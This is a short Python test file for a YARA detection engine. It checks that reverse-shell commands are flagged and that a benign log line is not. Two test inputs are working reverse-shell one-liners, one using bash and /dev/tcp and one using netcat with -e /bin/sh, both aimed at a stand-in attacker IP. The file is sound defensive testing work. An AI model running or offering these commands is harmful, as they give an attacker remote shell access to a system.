from app.detection.yara_engine import load_yara_rules, scan_message


def test_yara_rules_compile():
    rules = load_yara_rules()
    assert rules is not None


def test_bash_reverse_shell_detected():
    rules = load_yara_rules()
    matches = scan_message(rules, "bash -i >&/dev/tcp/203.0.113.5/4444 0>&1")
    assert len(matches) == 1
    assert matches[0]["rule"] == "Reverse_Shell_Command_Pattern"
    assert matches[0]["meta"]["mitre_technique"] == "T1059"


def test_netcat_reverse_shell_detected():
    rules = load_yara_rules()
    matches = scan_message(rules, "nc -e /bin/sh 203.0.113.5 4444")
    assert len(matches) == 1


def test_benign_message_no_match():
    rules = load_yara_rules()
    matches = scan_message(rules, "routine backup job completed successfully")
    assert matches == []
